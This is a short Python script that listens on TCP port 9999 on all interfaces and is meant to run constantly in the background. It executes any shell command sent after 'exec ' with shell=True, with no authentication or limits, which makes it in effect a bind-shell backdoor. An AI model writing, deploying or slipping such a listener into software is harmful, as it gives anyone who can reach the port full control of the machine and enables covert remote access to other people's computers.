# THIS NEEDS TO BE ON A PC AND ALWAYS BE ACTIVE IN THE BACKGROUND!
import socket
import threading
import subprocess

def handle_client(client_socket):
    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'ping': # ping to make sure its running
            client_socket.send(b'Running')
        elif command.lower().startswith('exec '): # execute commands on the machine
            subprocess.Popen(command[5:], shell=True)
        elif command.lower() == 'exit': # exit script
            break
    client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print('Listening on port 9999...')
    
    while True:
        client_socket, addr = server.accept()
        print(f'Accepted connection from {addr}')
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    main()
